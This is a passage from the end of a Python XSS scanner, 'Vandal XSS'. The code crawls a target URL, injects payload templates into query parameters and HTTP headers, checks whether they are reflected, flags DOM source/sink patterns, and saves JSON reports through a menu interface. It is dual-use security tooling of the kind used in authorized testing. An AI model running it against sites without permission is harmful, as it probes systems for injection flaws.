            return
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.S | re.I)
        combined = "\n".join(scripts)
        for js_url in (self.crawl_result or {}).get("js_files", [])[:20]:
            try:
                combined += "\n" + self.http.req("GET", js_url).text
            except Exception:
                continue
        srcs = [s for s in DOM_SOURCES if s in combined]
        snks = [s for s in DOM_SINKS if s in combined]
        if srcs and snks:
            print(f"  {C.YEL}DOM sources: {srcs}{C.R}")
            print(f"  {C.YEL}DOM sinks:   {snks}{C.R}")
            self.findings.append({
                "type": "dom-review-required", "param": "DOM", "context": "js",
                "payload": f"Sources: {srcs}\nSinks: {snks}",
                "desc": "Potential DOM source/sink patterns; manual review required",
                "url": self.url, "method": "GET", "source": "dom",
                "status_code": r.status_code,
                "content_type": r.headers.get("Content-Type", ""),
                "final_url": r.url,
            })

    def test_headers(self):
        for hn in ["User-Agent", "Referer", "X-Forwarded-For"]:
            if self.stopped:
                break
            marker = new_marker()
            try:
                r = self.http.req("GET", self.url, headers={hn: marker})
            except Exception as e:
                self.errors.append({"url": self.url, "error": str(e),
                                    "time": datetime.now().isoformat()})
                continue
            if marker not in r.text:
                continue
            ctx = detect_context(r.text, marker) or "html"
            print(f"  {C.CYN}{hn}{C.R} {C.GRY}[{ctx}]{C.R}")
            for tpl, desc in self.payloads.get(ctx, [])[:50]:
                p = tpl.replace("{M}", marker)
                self.attempted += 1
                try:
                    r2 = self.http.req("GET", self.url, headers={hn: p})
                except Exception:
                    continue
                if is_reflected_raw(r2.text, p):
                    self.findings.append({
                        "type": "header-reflected-input",
                        "param": f"Header:{hn}", "context": ctx,
                        "payload": p, "desc": desc,
                        "url": self.url, "method": "GET", "source": "header",
                        "status_code": r2.status_code,
                        "content_type": r2.headers.get("Content-Type", ""),
                        "final_url": r2.url,
                    })
                    print(f"    {C.GRN}✓ reflected-input{C.R} — {desc}")
                    break

    def run(self):
        print()
        try:
            r = self.http.req("GET", self.url)
            print(f"  {C.GRY}Status:{C.R} {r.status_code}  "
                  f"{C.GRY}Size:{C.R} {len(r.text)} bytes")
        except Exception as e:
            print(f"  {C.RED}[x] Unreachable: {e}{C.R}")
            self.errors.append({"url": self.url, "error": str(e),
                                "time": datetime.now().isoformat()})
            return {"url": self.url, "error": str(e),
                    "errors": self.errors, "findings": []}

        targets = self.discover()

        original = len(targets)
        targets = [t for t in targets if t["method"].upper() in ("GET", "HEAD")]
        if original > len(targets):
            print(f"  {C.YEL}[!] Skipping {original - len(targets)} POST "
                  f"target(s) — read-only mode{C.R}")

        if self.param:
            targets = [t for t in targets if t["param"] == self.param]
        if not targets:
            print(f"\n  {C.YEL}[!] No test targets (no GET params){C.R}")
        else:
            if len(targets) > self.max_targets:
                print(f"\n  {C.YEL}[!] {len(targets)} targets > limit "
                      f"{self.max_targets}, testing first {self.max_targets}{C.R}")
                targets = targets[:self.max_targets]

            print(f"\n{C.BLU}[*] Testing {len(targets)} target(s) with "
                  f"{_MODE_COUNTS[self.mode]} payloads{C.R}")
            for i, t in enumerate(targets, 1):
                if self.stopped:
                    break
                print(f"\n  {C.GRY}({i}/{len(targets)}){C.R} "
                      f"{C.CYN}{t['method']}{C.R} {t['url'][:60]} "
                      f"{C.GRY}param={t['param']}{C.R}")
                self.run_param(t)

        if self.test_dom:
            print(f"\n{C.BLU}[*] DOM analysis{C.R}")
            self.check_dom()
        if self.enable_header_tests:
            print(f"\n{C.BLU}[*] Header reflection tests{C.R}")
            self.test_headers()
        if self.test_csp:
            print(f"\n{C.BLU}[*] CSP{C.R}")
            self.check_csp()

        return {
            "url": self.url,
            "timestamp": datetime.now().isoformat(),
            "mode": self.mode,
            "checked": self.checked,
            "payloads_attempted": self.attempted,
            "crawl": {
                "pages": self.crawl_result["pages"] if self.crawl_result else 0,
                "urls": len(self.crawl_result["urls"]) if self.crawl_result else 0,
                "forms": len(self.crawl_result["forms"]) if self.crawl_result else 0,
                "js": len(self.crawl_result["js_files"]) if self.crawl_result else 0,
                "api": len(self.crawl_result["api_paths"]) if self.crawl_result else 0,
            },
            "errors": self.errors,
            "warnings": self.warnings,
            "inconclusive": self.inconclusive,
            "findings": self.findings,
        }


class Menu:
    def __init__(self):
        self.cfg = {
            "url": "", "mode": "fast", "param": None, "data": {},
            "cookies": {}, "headers": {}, "proxy": None, "timeout": 8,
            "test_headers": False, "test_dom": True, "test_csp": True,
            "crawl_pages": 30, "crawl_depth": 2, "max_targets": 20,
        }
        self.last = None

    def header(self):
        print(f"\n  {C.B}Vandal XSS — {self.cfg.get('mode','fast').upper()} "
              f"({_MODE_COUNTS.get(self.cfg.get('mode','fast'), 0)} payloads){C.R}")

    def main_menu(self):
        while True:
            clear(); self.header()
            print(f"\n  {C.GRY}fast={_MODE_COUNTS['fast']}  "
                  f"normal={_MODE_COUNTS['normal']}  "
                  f"deep={_MODE_COUNTS['deep']}{C.R}\n")
            print(f"  {C.CYN}[1]{C.R} {C.B}Start Scan{C.R}")
            print(f"  {C.CYN}[2]{C.R} Settings")
            print(f"  {C.CYN}[3]{C.R} View Last")
            print(f"  {C.CYN}[4]{C.R} Exit")
            ch = input(f"\n  {C.GRY}>{C.R} ").strip()
            if ch == "1":
                self.start()
            elif ch == "2":
                self.config_menu()
            elif ch == "3":
                self.view_last()
            elif ch == "4":
                break

    def config_menu(self):
        while True:
            clear(); self.header()
            c = self.cfg
            print(f"\n  {C.B}Settings{C.R}\n")
            for n, name, val in [
                ("1", "URL", c['url'] or f"{C.RED}(not set){C.R}"),
                ("2", "Mode", c['mode']),
                ("3", "Parameter", c['param'] or f"{C.GRY}(all){C.R}"),
                ("4", "POST data (unused)", str(c['data']) if c['data'] else f"{C.GRY}(none){C.R}"),
                ("5", "Cookie", str(c['cookies']) if c['cookies'] else f"{C.GRY}(none){C.R}"),
                ("6", "Headers", str(c['headers']) if c['headers'] else f"{C.GRY}(none){C.R}"),
                ("7", "Proxy", c['proxy'] or f"{C.GRY}(none){C.R}"),
                ("8", "Timeout", f"{c['timeout']}s"),
                ("9", "Crawl pages", c['crawl_pages']),
                ("10", "Crawl depth", c['crawl_depth']),
                ("11", "Max targets", c['max_targets']),
            ]:
                print(f"  {C.CYN}[{n}]{C.R} {name:<24} {C.YEL}{val}{C.R}")
            print()
            for n, key, name in [
                ("12", "test_headers", "Test Headers"),
                ("13", "test_dom", "Test DOM"),
                ("14", "test_csp", "Test CSP"),
            ]:
                s = f"{C.GRN}ON{C.R}" if c[key] else f"{C.RED}OFF{C.R}"
                print(f"  {C.CYN}[{n}]{C.R} {name:<30} {s}")
            print(f"\n  {C.GRY}[0]{C.R} Back")
            ch = input(f"\n  {C.GRY}>{C.R} ").strip()
            if ch == "0":
                break
            try:
                if ch == "1":
                    u = input("  URL: ").strip()
                    if u:
                        c['url'] = u
                elif ch == "2":
                    m = input("  Mode [fast/normal/deep]: ").strip().lower()
                    if m in ("fast", "normal", "deep"):
                        c['mode'] = m
                        c['max_targets'] = {"fast": 20, "normal": 50, "deep": 200}[m]
                elif ch == "3":
                    p = input("  Parameter (blank=all): ").strip()
                    c['param'] = p if p else None
                elif ch == "4":
                    d = input("  POST data (k=v&k2=v2): ").strip()
                    dd = {}
                    if d:
                        for kv in d.split("&"):
                            if "=" in kv:
                                k, v = kv.split("=", 1); dd[k] = v
                    c['data'] = dd
                elif ch == "5":
                    s = input("  Cookie (k=v; k2=v2): ").strip()
                    cc = {}
                    if s:
                        for kv in s.split(";"):
                            if "=" in kv:
                                k, v = kv.strip().split("=", 1); cc[k] = v
                    c['cookies'] = cc
                elif ch == "6":
                    s = input("  Header (K: V) blank=clear: ").strip()
                    if s and ":" in s:
                        k, v = s.split(":", 1)
                        c['headers'][k.strip()] = v.strip()
                    else:
                        c['headers'] = {}
                elif ch == "7":
                    p = input("  Proxy (blank=none): ").strip()
                    c['proxy'] = p if p else None
                elif ch == "8":
                    t = input(f"  Timeout [{c['timeout']}]: ").strip()
                    if t.isdigit():
                        value = int(t)
                        if 1 <= value <= 120:
                            c['timeout'] = value
                        else:
                            print("  Timeout must be between 1 and 120"); pause()
                elif ch == "9":
                    t = input(f"  Crawl pages [{c['crawl_pages']}]: ").strip()
                    if t.isdigit():
                        value = int(t)
                        if 1 <= value <= 500:
                            c['crawl_pages'] = value
                        else:
                            print("  Pages must be between 1 and 500"); pause()
                elif ch == "10":
                    t = input(f"  Crawl depth [{c['crawl_depth']}]: ").strip()
                    if t.isdigit():
                        value = int(t)
                        if 0 <= value <= 10:
                            c['crawl_depth'] = value
                        else:
                            print("  Depth must be between 0 and 10"); pause()
                elif ch == "11":
                    t = input(f"  Max targets [{c['max_targets']}]: ").strip()
                    if t.isdigit():
                        value = int(t)
                        if 1 <= value <= 500:
                            c['max_targets'] = value
                        else:
                            print("  Targets must be between 1 and 500"); pause()
                elif ch in ("12", "13", "14"):
                    key = {"12": "test_headers", "13": "test_dom", "14": "test_csp"}[ch]
                    c[key] = not c[key]
            except (EOFError, KeyboardInterrupt):
                pass

    def start(self):
        if not self.cfg['url']:
            print(f"\n  {C.RED}[!] Set URL first{C.R}"); pause(); return
        if not validate_url(self.cfg['url']):
            print(f"\n  {C.RED}[!] Invalid URL{C.R}"); pause(); return

        clear(); self.header()
        print(f"\n  {C.GRY}URL:{C.R}          {C.B}{self.cfg['url']}{C.R}")
        print(f"  {C.GRY}Mode:{C.R}         {self.cfg['mode']} "
              f"({_MODE_COUNTS[self.cfg['mode']]} payloads)")
        print(f"  {C.GRY}Crawl:{C.R}        {self.cfg['crawl_pages']} pages, "
              f"depth {self.cfg['crawl_depth']}")
        print(f"  {C.GRY}Max targets:{C.R}  {self.cfg['max_targets']}")
        print(f"  {C.GRY}Mode:{C.R}         read-only (GET/HEAD only)")
        print(f"\n  {C.GRY}Ctrl+C to abort.{C.R}")
        try:
            s = XSSScanner(self.cfg)
            self.last = s.run()
            self.show_results(self.last)
        except KeyboardInterrupt:
            print(f"\n  {C.YEL}[!] Aborted{C.R}")
        except ValueError as e:
            print(f"\n  {C.RED}[!] {e}{C.R}")
        pause()

    def show_results(self, result):
        print(f"\n{C.BLU}{'═'*74}{C.R}")
        print(f"{C.BLU}{C.B}  Scan Report (reflection-only){C.R}")
        print(f"{C.BLU}{'═'*74}{C.R}\n")
        fs = result.get("findings", [])
        cr = result.get("crawl", {})
        print(f"  {C.GRY}Crawled:{C.R}       {cr.get('pages',0)} pages")
        print(f"  {C.GRY}URLs found:{C.R}    {cr.get('urls',0)}")
        print(f"  {C.GRY}Forms:{C.R}         {cr.get('forms',0)}")
        print(f"  {C.GRY}JS files:{C.R}      {cr.get('js',0)}")
        print(f"  {C.GRY}API paths:{C.R}     {cr.get('api',0)}")
        print(f"  {C.GRY}Params tested:{C.R} {result.get('checked',0)}")
        print(f"  {C.GRY}Payloads tried:{C.R} {result.get('payloads_attempted',0)}")
        print(f"  {C.GRY}Errors:{C.R}         {len(result.get('errors', []))}")
        print(f"  {C.GRY}Mode:{C.R}          {result.get('mode','-')}\n")
        if not fs:
            if result.get("error") or result.get("errors"):
                print(f"  {C.YEL}[!] Scan incomplete or errors occurred{C.R}\n")
            else:
                print(f"  {C.GRN}✓ No findings detected by the available checks{C.R}\n")
            return
        print(f"  {C.RED}{C.B}⚠ {len(fs)} finding(s){C.R}\n")
        for i, f in enumerate(fs, 1):
            col = C.RED if 'reflected' in f['type'] else (C.YEL if 'dom' in f['type'] else C.MAG)
            print(f"  {col}[{i}]{C.R} {C.B}{f['type']}{C.R} — {C.CYN}{f['param']}{C.R}")
            print(f"      {C.GRY}source:{C.R} {f.get('source','-')}  "
                  f"{C.GRY}ctx:{C.R} {f['context']}  "
                  f"{C.GRY}desc:{C.R} {f['desc']}")
            if f.get("status_code"):
                print(f"      {C.GRY}status:{C.R} {f['status_code']}  "
                      f"{C.GRY}ctype:{C.R} {f.get('content_type','-')}")
            if f.get("final_url"):
                print(f"      {C.GRY}final:{C.R}  {f['final_url'][:80]}")
            if f['payload'] and f['payload'] != "-":
                for ln in f['payload'].split("\n")[:3]:
                    print(f"      {C.MAG}{ln[:80]}{C.R}")
            if f.get('url'):
                print(f"      {C.GRY}url:{C.R}    {f['url'][:88]}")
            print()
        fn = f"xss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(fn, "w", encoding="utf-8") as fh:
                json.dump(result, fh, indent=2, ensure_ascii=False)
            print(f"  {C.GRN}Saved:{C.R} {fn}\n")
        except OSError as e:
            print(f"  {C.RED}[!] Could not save report: {e}{C.R}")

    def view_last(self):
        clear(); self.header()
        if not self.last:
            print(f"\n  {C.GRY}No scan yet{C.R}"); pause(); return
        self.show_results(self.last); pause()


if __name__ == "__main__":
    try:
        Menu().main_menu()
    except KeyboardInterrupt:
        print(f"\n{C.GRY}Bye.{C.R}\n")